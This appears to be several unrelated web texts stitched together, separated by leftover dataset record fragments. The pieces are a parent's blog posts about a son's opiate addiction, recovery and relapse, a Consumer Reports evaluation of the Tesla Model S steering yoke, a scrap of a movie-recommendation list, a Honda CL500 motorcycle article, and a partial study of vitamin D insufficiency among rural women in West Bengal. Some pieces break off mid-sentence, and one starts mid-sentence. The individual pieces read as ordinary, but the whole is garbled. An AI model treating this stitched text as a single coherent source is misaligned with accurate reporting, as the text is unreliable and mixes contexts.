didn't respond to text messages or phone calls. The next day, he didn't show up at home or work, and still wasn't responding to outreach. His medication was on his dresser. The day after that, he still hadn't made contact \u2013 with us or with any of his friends.\nHe's 25 \u2013 an adult. We give him space and let him take responsibility for his life and decisions. In years past, he reacted terribly when we intervened claiming we were overreacting \u2013 that's the addiction talking.\nIn the three years he's been in recovery from opiate use, he's never missed work. He's always kept us posted on his whereabouts and work schedule. He's always let us know if he was going to stay at friends for the evening.\nGiven this, you can imagine our concern and worry. This behavior was out of the ordinary. Where was he? Had something tragic happened?\nThrough the grapevine, we learned he texted a co-worker that he'd been picked up for public intoxication and was being taken to detox. Two days later he texted the co-worker, \"I'm out :)\".\nIt's concerning, but we are grateful he's alive. Now, we're wondering what is next.\nIt's now been another 24 hours and he hasn't come home or responded to our outreach.\nWe don't take it personally. We're not mad. We're not going to yell at him or lecture him. We're simply concerned and want to be supportive. We want to have communication. We want to have him in our lives. We want him to come home.\nThis all reminds me of the earlier days of his addiction journey, which further reminds me that recovery is possible and available to him, again, when he is ready.\nOur family dog is the best-ever LADC (licensed alcohol and drug counselor). This rescue mutt came to us in early 2013. He was 14 weeks old and 19 pounds.\nLittle did we know what a prominent role he would play in our family \u2013 particularly in our son's life as he lives through addiction, sobriety, recovery and relapse.\nAt the time, our son was 19 and he was deep on his addiction path.\nAlthough I had hope, I realistically knew that tragedy was a distinct possibility.\nHe was bouncing between living at home, sofa surfing and being homeless.\nHe was every bit as much in need of rescue as our sweet puppy.\nWatching our son meet and interact with the puppy was pure delight. His heart showed. A smile returned. A tenderness came forth. Although he was struggling, he always had a few minutes to play with the puppy, take him outside to go potty and take him for walks around the neighborhood.\nIt was a bright spot for all of us to observe the bond and it was a reminder that there was a happier, healthier young man waiting to emerge from addiction.\nIt didn't happen right away, of course, and even when he decided to go to treatment about a year later it also included a devastating and rapid relapse that once again reminded us how fragile addiction renders its young adults.\nLater that year, he would decide again to pursue treatment, sobriety and recovery. This time it took. Our son was three years free from opiate use in July 2017. During this time, he got a job, earned money to return to college and got straight A's in his classes.\nThey spent many hours together. The love between the two warmed our hearts, and each one thrived in many ways.\nBut then there was a shift. Tiny at first, but unsettling. Then another shift, and then another and another.\nHere we are eight months later. Our son's personality \u2013 characterized by attitude, mood and behavior \u2013 has changed significantly.\nWe're all too familiar with his current state and fear the direction it's headed.\nExaggeration? No. It's a pattern we recognize, a pattern we've experienced before, a pattern we do not welcome but that we must acknowledge regardless. It's no longer just mom's and dad's radar, it's the dog's too.\nWithout a doubt, the dog knows. He waits by the mudroom door.\nWhen will my guy return he wonders. When are we going for an adventure he wonders. When will we hang out together he wonders. Why is my guy always sleeping when he's home? Why won't he talk nicely with Mom and Dad? Why didn't he celebrate his birthday? Why do I see his car down the street instead of coming home? Why did he come home and go right to his room? Why did he leave in the middle of the night? Will he come back?\nThe routine has changed, and our dog doesn't understand. He doesn't want to eat. He just wants to wait for his guy and get back to the sober, recovery days.\nWhat a Difference Recovery Makes!\nLife with #SoberSon is going pretty well these days.\nThree years ago, not so much. Then finally recovery came. For real this time.\nBecause things were so bleak, it was hard to be hopeful but our family maintained a hopeful outlook even on the darkest days.\nIn our son's early recovery, our hopes slowly turned into beliefs as he began to rebuild his life.\nAttending and graduating from a high-intensity out-patient treatment program focused on addiction to opioids.\nWorking through his journey with an amazing LADC.\nRebuilding relationships with family and friends.\nGetting a job and saving money.\nReturning to college to get an associate's degree in mathematics \u2013 and paying for it himself!\nMaking plans to complete his bachelor's degree.\nThinking about law school in the future.\nThis partial list is a living, breathing reminder that #SoberSon is making progress. But what makes it all the more rewarding is that he shares his successes with us \u2013 and his challenges. That's not the way it always was when he was using.\nNow he's more of an open book, which in turn means we trust him more and give him even greater privacy and independence. It's amazing how that works.\nIn spite of all the positive things going on, life still has its ups and downs but #SoberSon is better equipped to deal with these and it warms my heart when he shares the good and the not so good. He knows we are on his team \u2013 just as we always have been. But now he believes it.\nSetbacks no longer derail him, and for that I am proud and happy. Yes, recovery works!\nGrowing up, my mother used to sing \"Summertime and the livin' is easy.\" With her Southern drawl \u2013 she was from Georgia; it was nearly 40 years before she relocated to Iowa, where I was born \u2014 the lyrics, melody and beat transposed this Midwestern kid to another time and place.\nThat same song used to get my three kiddos laughing and hamming it up when it came on the oldies station. #SoberSon, in particular around age six to 10, used to get a real kick out of it. Just thinking about it brings a smile to my face, a memory of truly good times.\nSince embracing sobriety during summer 2014, #SoberSon has made such progress in recovery. He successfully completed a treatment program and continues to see his counselor regularly. He enrolled in college classes and earns tuition and books with his part-time job.\nThe first semester (spring 2015) that he started at the community college, he did so with a sense of responsibility but it took an inordinate amount of time and energy to take placement tests, write an appeal letter, register for classes, meet with his academic advisor, order textbooks and get ready for class. But, come the first day of classes, he was ready and he dug in to studying, earned excellent grades and committed to taking classes again for fall semester 2015.\nDuring that first summer without classes, I worried about him having time on his hands, but he managed it quite well and was rested and ready for fall semester. By this time, he knew the ropes and truly committed himself as a student. Ditto for spring 2016. Excellent study habits paid off with excellent grades \u2026 and exhaustion \u2013 welcome summer break 2016.\nThis summer is so pleasant. He isn't sleeping in all day. He isn't playing video games all day. In addition to his part-time job, he's been reading books, catching up on some television series, taking the dog on adventures, helping his sister ad brother in-law out with their dog, and sharing the family car with his younger brother. He's also had a bit more social life this summer catching up with old friends.\nIn other words, he's savoring summer and we are all thoroughly enjoying the routine. But, he's also looking forward to the school year ahead. Before the end of June, he'd outlined his fall semester classes and completed registration in July. What's more, he had already earned the tuition. And, just this weekend, several of his fall textbooks arrived. Last night, he even shopped for school supplies.\nSobriety and recovery continue to evolve for #SoberSon. Being able to savor today while looking forward to tomorrow is clearly an encouraging sign. The \"Summertime\" tune is stuck in my head as I do a little mom dance just thinking about his sobriety!\nWe hear a lot about service as an important part of recovery. Midwestern Mama observes #SoberSon experience the boost in self-esteem that comes from helping others \u2013 this time, a rescue puppy who needs a home.\nJust as there is no one-size-fits-all treatment program, the same should be said for recovery. My son floundered in traditional approaches yet has thrived in the past 18 months through a guided, but self-directed program. In addition to counselors and family members, our family dog has been a central part of his recovery, and most recently, a new dog has offered him an opportunity to grow.\nEnter a two-year-old pit-bull mix from a local adoption program that works through foster homes instead of shelters. Our daughter and son in law are fostering the puppy until it gets its \"forever\" home. Because they work overlapping full-time schedules, there are some points during the day when they need someone to let out the dog, take it for walks, and give it some love.\nEnter #SoberSon. His spring semester college schedule has him wrapping up classes by early afternoon a couple days each week, so he's able to take on dog duty those days. Not only is this another example of the growing trust that our family now has in our son \u2013 he has a key to their house \u2013 it's an awesome opportunity for him to volunteer his time in exchange for tail wags and dog kisses!\nHe realizes that he's saving the dog's life and helping it heal from whatever past it may have had.\nHe commented the other day that, \"it's all about giving him a second chance.\" My heart melted because, I think he realizes that he, too, got a second chance when he embraced treatment, sobriety and recovery.\nBlogs I'd like to write, but haven't yet written.\nThe more I write, the more I want to write \u2013 mostly before there is always more I want to share. This is certainly the case when it comes to Our Young Addicts. There is so much to talk about and so many topics that parents, young people in recovery, and addiction/treatment professionals want to read about.\nAs the back-to-school season moves forward, I have less and less time to write. Fall is always a busy time for my business (unrelated to Our Young Addicts, although I do have a few clients in the addiction space). In addition, I am an adjunct professor at a local university, so I'm in the classroom two nights a week plus grading my students' papers. And, as every parent knows, the school year brings extra commitments \u2013 getting up earlier to get my 15-year-old off to school, encouraging good homework habits, carpooling to sports practice, and more.\nMy day is the same as yours. Twenty four hours. No more. No less.\nYet, I still want to give Our Young Addicts just as much energy, passion and content as the summer months. Some of that I put in play with our #SoberSchoolYear campaign with Tweets and Facebook posts running daily to offer tips and insights.\nAs well, I owe you all a good update on #SoberSon and his continued success with recovery as well as an honest account of some of the struggles that run parallel on this path. These real-time observations prove valuable no matter where your kid (of any age) may be on the spectrum of experimentation, use, addiction, treatment, relapse, and recovery.\nFor now though, I'm just going to share a whole bunch of topics that I'd like to write about at some point. Let me know what you think. Tell me which ones are of greatest interest. I remain committed to one post per week about our family's journey; one guest post per week from a parent, young person in recovery, or addiction professional; and one #TBT column \u2013 because there is so much wisdom in the early days of my son's addiction and its impact on the family.\nComing to terms with we didn't cause this, can't change this, can't control this, can't cure this \u2026 yet were supposed to do these \"influential things\" that still might not work, reconciling all this.\nDual diagnosis \u2013 are there different rules for support? For action? For expectations?\nIn one of my many English courses, I remember someone attributing this quote to Ernest Hemmingway, \"I don't like to write, I like having written.\" This says a lot about the discipline of writing and the compulsion to edit. For this and many other reasons, I have never thought that I should edit content for Our Young Addicts \u2013 that it should come from the heart and brain to the page, just as it is.\nThere you have it, just as it is!\nThanks for reading and for your continued support and participation as part of the #OYACommunity.\nTrue to his word, Midwestern Mama's #SoberSon will return to community college this fall, and he's doing it on his own. Another example of recovery in progress!\nBack to the lecture hall for fall classes at community college.\nFall classes at my son's community college don't start until the end of August, but he's already registered and has earned enough money for tuition and books. This is significant. It's nothing short of an amazing transformation from addiction to recovery.\nJust think, a year ago he had started another treatment program and it really felt different \u2013 better \u2013 this time. That alone was encouraging for us and empowering for him. We had hope, but in the past the new-car smell would wear off and we'd be left with another broken-down clunker.\nAs he went through the treatment program and began living in recovery, he started talking about going back to college part time. By December, he had completed the necessary steps including an appeal to override previous academic suspension from his addiction days.\nHis spring classes were tough, but he dug in and committed to attending and studying \u2013 receiving an A in English Composition and a B in Differential Equations and Linear Algebra.\nWhile building his confidence, it also stressed and exhausted him to the point that he decided not to take summer classes.\nIt's takes hard work to get back in the swing of doing home work and studying for college classes.\nAmid a more relaxed schedule this summer and a lot of video games, we've been hopeful that he would return to community college in the fall. However, we know not to push or hover because that stresses him.\nTrue to his word, however \u2013 and this is a new behavior that we are coming to appreciate more and more each day \u2013 he just registered for fall classes AND informed us that he's earned enough from his part-time job to pay tuition and buy books. He's moving from eight credits up to 12 credits, a nice manageable load, and I'm looking forward to the routine of having him in class and doing homework, but not until we enjoy another month of summer!", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 68964}
{"text": "Tesla's New Steering Yoke Shows Little Benefit and Potential Safety Pitfalls\nTen CR test drivers chronicle their driving difficulties with the steering wheel replacement in our new Model S\nBy Keith Barry\nshares of the article\nPhoto: John Powers/Consumer Reports\nMy hands hurt. That's no surprise\u2014they usually ache at the end of the day, thanks to unlucky genetics and years of writing for a living. But as I type this, the soreness is exacerbated because of an unusual source: A few hours spent behind the new steering \"yoke\" of the brand-new Tesla Model S that we just purchased for testing.\nIn case you missed the social media photos and videos, Tesla swapped the tried-and-true round steering wheel for a flat-bottomed, rectangular yoke reminiscent of what pilots use to steer an airplane. A traditional circular steering wheel is no longer available on the Model S nor on the mechanically related Model X SUV, even as an option. And that's not the only steering wheel change. Flat, touch-sensitive buttons on the yoke replaced the vehicle's turn signal and windshield wiper stalks. Those buttons also are how drivers now flash their high-beams or honk the horn.\nMORE ON TESLA\nTesla's 'Full Self-Driving' Beta Software Used on Public Roads Lacks Safeguards\nIn Tesla Autopilot Investigation, Federal Regulators Ask Other Automakers for Their Data\nCR Engineers Show a Tesla Will Drive With No One in the Driver's Seat\nPreview: Edgy Electric Tesla Cybertruck Boasts Rapid Acceleration, Long Range\nOnce we've driven our brand-new Model S a few more miles, we'll publish a fuller First Drive review that will go into detail about all the changes to the updated car. And after we've completed months of in-depth testing\u2014the same tests that Consumer Reports conducts on every car we anonymously purchase and evaluate\u2014we'll publish our full review of the vehicle with test results. But the yoke is such a jarring departure from the norm that we felt it deserved its own evaluation. Tweets about the yoke get thousands of likes. Friends and family ask us, \"Have you tried the yoke?\"\nSo we devoted this entire article to the yoke. Over the course of a full week, 10 of our test drivers chronicled every time it slipped out of their hands during a turn, every ache and pain from gripping the handles during a highway cruise, every time a tester's hands didn't fit on the yoke's grips, every time we accidentally honked the horn while trying to make a turn, and every time we had to look down to see which turn signal was which\u2014so you can decide whether it's a deal-breaker for what appears to be an otherwise excellent EV. We haven't studied all steering wheels this closely, so we don't have official comparative data. But we know cars, and we know steering wheels.\nWhat we don't know is why, in the words of one of our testers, Tesla chose to turn the humble-but-effective steering wheel into a \"meme.\" Tesla is famous for departing from traditional norms, often for good reasons\u2014plenty of other automakers now send software updates directly to vehicles, a strategy that Tesla pioneered. But the steering wheel is so essential, ubiquitous, and universally understood, that to change it for the sake of changing it seems both foolish and foolhardy. Tesla did not respond to our inquiries for this article, and has not answered questions from our reporters since May 2019. But Tesla CEO Elon Musk's own words seem to suggest that the change is purely for cosmetic reasons.\nYet another round wheel is boring & blocks the screen. FSD in panoramic mode looks way better with a yoke.\n\u2014 Elon Musk (@elonmusk) September 9, 2021\n\"Yet another round wheel is boring,\" he tweeted earlier this month. The yoke might look cool, and it's not impossible to get used to. But it doesn't yet seem to offer much benefit, and even a slight drawback is a major concern when it comes to steering a moving vehicle, says Jake Fisher, senior director of Consumer Reports' Auto Test Center.\nAlthough Musk has promised that the fully autonomous Teslas of the future won't have steering wheels or even pedals, today's Teslas very much still need a human driver\u2014a driver who is likely very used to a traditional steering wheel. \"It's as if Apple got rid of the iPhone's headphone jack before Bluetooth was even invented,\" Fisher says.\nFirst, the Good News\nThe yoke isn't without at least one benefit. In other vehicles, a few of our testers occasionally complain that their preferred seating position puts the top of the steering wheel in the way of the speedometer and other displays. The yoke gives a panoramic view of the Model S' wide gauge cluster (the screen or gauges that traditionally sit behind the steering wheel) but its bottom right corner blocks a portion of the center control panel, which is also the location of the one button that displays the all-important vehicle controls menu.\nPhoto: John Powers/Consumer Reports Photo: John Powers/Consumer Reports\nTrouble Making Turns\nThe obvious drawbacks of steering with a yoke became apparent almost from the moment we took the Model S on the road. \"Backing out of my driveway, my hands slipped off the wheel multiple times, which was startling,\" said Alex Knizek, an automotive engineer at CR.\nTraditional methods of making a sharp turn at a corner or into a parking lot or driveway\u2014hand-over-hand turning and shuffle steering\u2014are impossible, thanks to where the yoke \"ends\"\u2014on a steering wheel, you'd compensate for having to rotate the wheel 180\u00b0 by starting with your hand at the base of the wheel. But the yoke's curtailed top and squared-off bottom makes such a move impossible.\nAnother tester said her hands were too small to get a good grip in the first place as the yoke seemed too thick, apparently designed for larger hands to hold.\n(Note that the traditional advice of keeping hands at the 10 and 2 positions has changed with the advent of airbags. AAA and others now recommend keeping hands at 9 and 3, or 8 and 4, and shuffle steering instead of making hand-over-hand turns.)\nWe also found issues at higher speeds. \"Taking turns at higher speed, when the wheel is providing more significant resistance in your hand, there's nothing to 'catch' if you lose your grip, so you can end up momentarily losing control mid-turn,\" Knizek says.\nNow, imagine that the driver wasn't as diligent and safe as Alex, and instead had a cup of coffee or a phone in their other hand. That momentary lack of grip could lead to an even greater loss of control.\nHard to Hold On To\nUnless you're a particularly nervous driver, you probably don't grip your steering wheel tightly. But that's exactly what the yoke forced me and other drivers to do. There's nowhere to rest your hands, even if they start to hurt, so you have to grasp the yoke's handles. Even with Autopilot's lane centering and adaptive cruise control active, drivers must keep their hands on the yoke.\nThe lack of a turn signal stalk actually bothers me even more than the steering wheel\nJake Fisher\nSenior Director, Auto Test\nFor me, such a grip becomes painful after just a few minutes\u2014even more so, because the \"grips\" on the yoke itself aren't well padded. Even those without carpal tunnel or repetitive strain injuries had similar complaints: One of our testers took a three-hour highway trip in the Model S, and hand soreness was the first thing he mentioned afterward. And another tester said her hands were too small to get a good grip in the first place as the yoke seemed too thick, apparently designed for larger hands to hold. As a result, she had to grip the yoke uncomfortably harder than she would a traditional steering wheel.\nThe shape of the yoke itself adds an unnecessary layer of confusion, especially during a three-point turning maneuver. \"As you rotate a round steering wheel you always know what to expect, even when you aren't looking,\" says Knizek. \"With a yoke, you might get a corner, a flat side, or nothing at all.\" Another test driver commented that instead of applying the consistent torque that's necessary to turn a steering wheel, the odd-shaped yoke requires the driver to exert various different degrees of push and pull forces, which can cause the car to lurch instead of steering smoothly.\nIn nearly every other car, the turn signal stalk sits behind the steering wheel and does not move as the wheel turns. But the Tesla's turn signal buttons are mounted on the yoke and move as it turns, so they might end up pointing the opposite direction if the wheel is turned. Multiple CR testers complained that it was extremely difficult to figure out which button to press without pausing to look down at the steering wheel. A few testers confessed that they made some turns without signaling to avoid dealing with the button issue.\nIf you engage the turn signal switch with a light press, the turn signal will flash three times\u2014useful for indicating a lane change\u2014and the yoke will vibrate once to alert you that it's active. Press it harder and the yoke will vibrate twice, while the turn signal will stay on until the driver cancels it by pressing the button again. Unfortunately, it's hard to make a distinction between the two because there's no physical button to press. It's especially tricky on a bumpy road.\n\"The lack of a turn signal stalk actually bothers me even more than the steering wheel,\" says Fisher.\nSorry 'Bout That!\nLike the turn signals, the other buttons on the yoke are touch-sensitive and flush mounted, which makes them too easy to activate unintentionally. I inadvertently flashed my high-beams at oncoming traffic multiple times, only realizing I'd done so after the yoke vibrated to let me know I'd pressed one of the touch buttons. Other drivers had similar problems. \"I accidentally washed the windshield and honked the horn at innocent road-goers while making turns,\" says Knizek. And another driver who actually had to use the horn when an oncoming truck was about to cross the center line couldn't find the horn button in time to press it.\nHigh-Speed Driving\nProponents of the yoke might point to the record-setting lap the Model S Plaid set at the N\u00fcrburgring, the famed German race track where automakers duke it out for bragging rights. But high-speed racing on a track requires a lot of little steering adjustments, not the sort of big moves that are easier with a wheel than a yoke. Swerving to avoid road debris or a stopped vehicle may be more difficult, says Fisher. \"I am concerned if I would be able to control the vehicle well in an emergency situation,\" he says.\nCase in point: We are currently determining what kind of additional practice our trained test drivers might need before putting the Model S through our avoidance maneuver test, which simulates swerving at a high speed to avoid an obstacle in the road.\nKeith Barry\nDespite my love for quirky, old European sedans like the Renault Medallion, it's my passion to help others find a safe, reliable car that still puts a smile on their face\u2014even if they're stuck in traffic.

It's a great way to get you in the theatre for movies you may not have considered otherwise.\n\"American Animals\" is the MoviePass-funded film that is actually good (\"Gotti,\" not so much). Featuring a great young cast that includes \"American Horror Story's\" Evan Peters and \"Dunkirk's\" Barry Keoghan, \"American Animals\" is a heist movie based on a true story. Barry Layton's experience with documentary filmmaking shines through the narrative in a very literal way.\nWhile the movie may not have been well-received by critics, it might appeal to an older audience just looking for a funny, relatable movie with a dynamite cast that includes Jane Fonda and Diane Keaton.\n\"Hearts Beat Loud\" is a new feel-good movie starring \"Parks and Rec's\" Nick Offerman and rising star Kiersey Clemons. The two play a father-daughter duo who join forces to start a band before Clemons' character leaves for college. If you're looking for a heartwarming and funny family film, this may be for you.\nOne of the biggest surprise critical hits of the year is \"Upgrade,\" but it goes to show production company Blumhouse can do little wrong. The producers behind Oscar-standout \"Get Out,\" horror hits \"The Purge\" and \"Happy Death Day,\" and the upcoming \"Halloween\" movie offer this small but effective sci-fi thriller.\nAt a time of so much tension and turmoil, \"Won't You Be My Neighbour?\" is being hailed as a reminder that good people exist. The documentary from Morgan Neville, the director of the Oscar-winning doc \"20 Feet From Stardom,\" transports audiences back in time for a major dose of nostalgia, and helps people of all ages remember the legacy of childhood icon Fred Rogers.\namerican animals features hearts beat loud movie theater moviepass the book club thewire-us upgrade won't you be my neighbor?", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 7395}

Read on to learn a bit more about the history of this motorcycle and what the new CL500 is all about.\nHonda has been getting smaller capacity motorbikes just right for riders worldwide by blending engine performance, easy usability, affordability, and individuality. Such bikes were the CLs from the '60s and '70s. They were scramblers \u2013 basically, they were CBs equipped with reinforced handlebars, high-mounted exhaust pipes, and off-road tires. They were designed to be enjoyed both on and off the road and soon became popular with collectors. However, the CL series was discontinued in the mid-70s when the CL200 and CL360 were canceled.\nFast-forward to 2018, the A2 license-compatible CMX 500 arrived in the Honda range. It was designed as a highly customizable old-school meets new-school vehicle and boasted specs irresistible to young riders. The model managed to become one of the top-selling custom bikes in Europe and served as an inspiration for the CL500.\nFive years later, Honda decided to take a similar old-meets-new approach for its new CL500 motorbike. It has the same formula as the original CLs \u2013 the looks, engine, and durability are clearly inspired by the originals. Customization is also a critical detail that Honda incorporated in the new model \u2013 your imagination is all that's required, as the company says.\nMr. Hiroshi Furuse, Large Project Leader for CL500 Honda R&D, said, \"We developed the CL500 as a machine that truly allows its owners to stand out from the crowd, and as a form of self-expression. It can be used and enjoyed casually \u2013 without hesitation \u2013 by the young generation in their daily lives and is designed to become a joyful and integral part of a lifestyle. In standard form, the off-road street style has a visual charm unlike any other model in the Honda range and can really inspire owners to take it further in any direction they wish.\"\nThe development concept for the CL500 project has been \"Express Yourself.\" Honda has deliberately targeted a young and style-conscious demographic, and the CL500 comes in as the ideal companion on your daily commute, weekend ride, or even some off-roading. Moreover, as younger riders are usually into customization, Honda has prepared a range of accessories that enhance the looks and performance of the bike.\nThe tubular steel main frame gives the bike a unique style while allowing easy handling. The round fuel tank shape and upswept muffler give off a nostalgic vibe, alongside more minor details such as the tank pads and rubber fork gaiters. Another detail reminiscent of the original CLs is the high-level handlebar, angled to offer leverage when standing and sitting down.\nThe scrambler-style motorcycle is made to handle it all, from rough city streets to dirt roads. Ground clearance is 155 mm (6.1 inches); in the front, there's a 41 mm fork with 5.9 inches of travel, and the aft suspension comes with preload-adjustable shocks with 5.7 inches of travel.\nOther notable features of the motorbike are the 175 mm diameter LED headlight, an LED taillight, and an LCD that displays information such as gear position indicator, fuel consumption, and individual indicator arrows.\nThe CL500 is powered by Honda's 471cc parallel twin-cylinder engine, which outputs 34.3 kW (46.6 ps) of power and 43.4 Nm (32 ft-lbs.) of torque. It's the same engine that the Rebel 500 boasts, only it has a different fuel mapping and a new intake. An assist/slipper clutch manages the six-speed gearbox.\nRegarding brakes, the CL500 features a two-piston front caliper with a 310 mm (12.2 inches) floating disc and a rear single-piston caliper with a 240 mm (9.5 inches) disc. The brakes have been balanced to provide efficient braking in all conditions, and the ABS is optimized for both dirt and asphalt use.\nAlthough a full range of genuine Honda accessories is available, for convenience, the company created three specially designed ready-to-go packs \u2013 Adventure Pack, Travel Pack, and Style Pack. I won't bore you with the exact items; you can find more info about them and the CL500 on Honda's official website.\nThe CL500 is relatively cosmetically similar to the Rebel. But looks aren't all that important, and Honda has made sure to improve the motorbike's performance and make sure it can handle both city and dirt use. The middleweight scrambler sounds good in theory, but we look forward to seeing it out and about and how Honda's community will react to the CL series revival.\nDownload: 23YM HONDA CL500 (PDF)\nHonda rebel CL500 motorcycle off-road City scrambler", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 33468}

Vitamin D status among women aged 40 years and above in a rural area of West Bengal: A community-based study. J Family Med Prim Care 2018;7:1263-7\nPan T, Banerjee R, Dasgupta A, Paul B. Vitamin D status among women aged 40 years and above in a rural area of West Bengal: A community-based study. J Family Med Prim Care [serial online] 2018 [cited 2020 Jan 21];7:1263-7. Available from: http://www.jfmpc.com/text.asp?2018/7/6/1263/246449\nVitamin D is a fat-soluble vitamin. Owing to its role in calcium homeostasis, it is also known as the 'sunshine vitamin' or 'anti-rachitic factor.'[1] The human body obtains sufficient amounts of vitamin D either from diet or adequate exposure to sunlight. Usually, 50\u201390% of vitamin D is produced by the skin on exposure to sun.[1] Natural diet that most humans consume contains less amounts of vitamin D. Important dietary sources of vitamin D are egg yolk, fatty fish, beef liver, and fortified dairy products.[2] The extra skeletal effects of vitamin D are related to glycemic control, immunity, and prevention of cardiovascular diseases and cancer.[3],[4]\nVitamin D deficiency is a recognized pandemic. Even in a tropical country like India, vitamin D deficiency is widely prevalent in spite of plentiful sunshine. Various studies from different parts of India have highlighted that vitamin D insufficiency or deficiency across different age groups range from 70\u2013100%.[5] Adult females, particularly those above 40 years of age, are mostly affected because vitamin D determines the pattern of post-menopausal bone loss and age-related osteoporosis.\nThis is the most underdiagnosed and undertreated nutritional deficiency in the world.[6],[7],[8] In India, vitamin D insufficiency (VDI) is not a National Health Priority (NHP). Of the NHPs, the most important is the supplementation of pregnant women with calcium and vitamin D tablets. However, the adult and geriatric population that is mostly vulnerable has been ignored. Although VDI has increasingly become an important public health issue, it is not included in any national health program.\nThere is a dearth of research regarding VDI in eastern India, and specifically in the rural community. This study was conducted to quantify the burden of VDI and find out its predictors among women aged 40 and above in a rural area of West Bengal.\nStudy design and setting\nThis was a cross-sectional, community based observational study, conducted over a period of nine months (April-December 2017). The Rural Health Unit and Training Centre, Singur is the rural field practice area of All India Institute of Hygiene and Public Health (AIIHPH), Kolkata, which caters to 64 villages through two Union Primary Health Centers (UPHCs).\nWomen aged 40 and above, residing in the villages under the purview of RHUTC, Singur, were the subjects of this study. The exclusion criteria included (i) pregnant and lactating women (ii) those that had not provided written informed consent (iii) patients who were critically ill and (iv) patients who were on vitamin D supplementation since the last 6 months.\nSample size and sampling technique\nWith reference to a study conducted in Mangalore[9], according to which the level of VDI was 80%, and taking into consideration 95% confidence level, 10% relative error and design effect of 2, the final sample size was calculated to be 194.\nMultistage random sampling was done. In the first stage, 3 villages were selected randomly from each UPHC. Women aged 40 and above were selected from villages, and the number of participants from each village was calculated by Population Proportionate to Size sampling method. Following this, the required number of samples was drawn from the list of women from each village using the simple random sampling method. If the selected individual did not meet the selection criteria or could not be contacted in two visits, simple random sampling without replacement was done to select another study participant.\nStudy tool\nA pre-designed, pre-tested structured schedule in the local language (Bengali) was used to collect the data. Face validity and content validity of the instrument were ascertained by experts of the institution from which the authors were affiliated. The height and weight of the women were measured using standard operating procedures. In the past 7 days, individuals who consumed fish, egg yolk, milk, or dairy products for more than 3 days were considered to have satisfactory diet rich in vitamin D. Individuals with Body Mass Index (BMI) \u226525 kg/m2 were reported as overweight/obese.[10] Laboratory investigation of serum for 25-Hydroxyvitamin D [25(OH)D] was done. Individuals with 25OH Vitamin D <30 ng/ml were categorized into the VDI group.[3]\nData analysis and ethical approval\nData entry and analysis was performed using the statistical software SPSS (IBM SPSS Statistics for Windows, Version 16.0). Descriptive statistics (mean \u00b1 Standard Deviation [SD] and median for the continuous variables and frequency in percentage for the categorical variables) was used to describe the sociodemographic characteristics, dietary pattern, daily sun exposure, tobacco use, and morbidity profile. Univariate and multivariable logistic regressions were used to determine the factors related with VDI. Results were considered significant at P < 0.05 level.\nEthical approval was obtained from the Institutional Ethics Committee. At the end of the study, patients with VDI were treated and advised about the preventive measures.\nOut of 194 participants, 93 (47.9%) belonged to the 40\u201349 age group. Mean (SD) age of the participants was 56.9 (8.9) years. Among them, 169 (87.1%) were Hindu and 172 (88.6%) were currently married. Furthermore, 102 (52.6%) lived in joint families, while 112 (57.7%) were educated upto primary. Mean (SD) per capita income was 2754 (1097) INR, and 98 participants (50.5%) belonged to middle class (according to Modified B. G. Prasad scale January 2017).\nMean (SD) duration of daily sun exposure was 138.5 (59.2) minutes. 81 participants (41.7%) were current tobacco chewers, while 6 participants (3%) had a history of smoking bidis. 82 women (42.3%) had menopause. It was found that 55 (28.3%) were hypertensives and 68 (35.0%) were suffering from diabetes. The proportion of women with overweight/obesity was 38.1%. In the past 7 days, although 61 (31.4%) consumed fish for more than 3 days and 56 (28.8%) ate egg yolk for more than 3 days, only 35 (18.0%) had milk and dairy products for more than 3 days.\nOut of the study participants, 57 (29.4%) had sufficient vitamin D (\u226530ng/ml), while 99 (51.0%) had insufficient vitamin D (20-29.99ng/ml) and 38 (19.6%) had deficient vitamin D (<20ng/ml) [Table 1]. The mean (SD) vitamin D level was 25.9 (5.21) ng/ml. Overall, the proportion of women suffering from VDI was 70.6%.\nTable 1: Distribution of study participants according to their vitamin D status and vitamin D levels (n=194)\nFrom [Table 2], it was evident that factors such as the decreasing age, education up to primary, low SES, the decreasing duration of daily sun exposure, menopause, diabetes, overweight/obesity, and unsatisfactory diet were significantly associated with VDI.\nTable 2: Univariate logistic regression between VDI and different variables (n=194)\nAfter adjusting for all the independent variables, only low SES, decreasing duration of daily sun exposure, diabetes, overweight/obesity, and unsatisfactory diet were significant predictors of VDI [Table 3]. The final model explained 39.3% of variance with non-significant Hosmer\u2013Lemeshow statistics.\nTable 3: Multivariable logistic regression between VDI and explanatory variables (n=194)\nOur study found that 70.6% of the women aged 40 years and above had VDI. This was lower than 99.7% of VDI as reported by a study among adult women in the rural community of Ballabgarh development block in Faridabad in 2017.[11] The finding of this study was also lower than that of another study in rural Maharashtra in 2017, where prevalence of VDI was reported to be 88.9%.[12] However, the findings are in line with that of a study conducted in Raipur in 2016 among post-menopausal women.[13] This may be attributed to the fact that in West Bengal, fish and egg consumption is more, which happen to be among the very few dietary sources of vitamin D.\nOur study suggests that the decreasing duration of sun exposure and diabetes are significantly associated with VDI. This finding is similar to that of a study[12] conducted among 640 rural patients in Mahad, Maharashtra in 2017, which identified that women with dark complexion, those who wear Burkha, women who get inadequate exposure to sunlight, and those with diabetes were the significant predictors of Vitamin D deficiency. Gender and hypertension were not significantly associated with vitamin D deficiency.\nAnother multi ethnic sample study of Asian adults also found that females, smokers, alcoholics, diabetes patients, young people, those with higher BMI or HbA1c, people who had no education and poor income levels are significantly associated with VDI.[14] This can be explained by the fact that vitamin D, a fat-soluble vitamin, gets sequestrated inside the adipose tissue (found more in obese individuals), resulting in pseudo VDI in the blood.\nVarious public health impacts of vitamin D deficiency require urgent attention. It is evident that vitamin D not only has a bearing on bone health, but also plays a crucial role in the overall health of an individual, right from its effect on glycemic control, immunity, cardiovascular diseases, neuromuscular function, pregnancy, and other aspects of health. An epidemiological study conducted in the United States among a cohort of 903 healthy individuals suggested that people with vitamin D deficiency may be at a much greater risk of developing diabetes.[15] It has been implicated that in people who suffer from cardiovascular diseases, maintenance of normal serum 25(OH) vitamin D level could reduce their mortality risk as a result of the disease by 30%.[16]\nIn the current global scenario, where non-communicable diseases have achieved pandemic potential and cardiovascular diseases remain the leading cause of death and disability, it has been recognized vitamin D3 significantly reduces the level of oxidative stress on the cardiovascular system.[17] Moreover, it has been implicated that deficiency of vitamin D3 increases the chances of heart attacks.[17] The increasing prevalence of obesity and physical inactivity, and decreased sun exposure due to lifestyle changes and unhealthy diet have all added to the increasing prevalence of VDI. The knowledge about the importance to 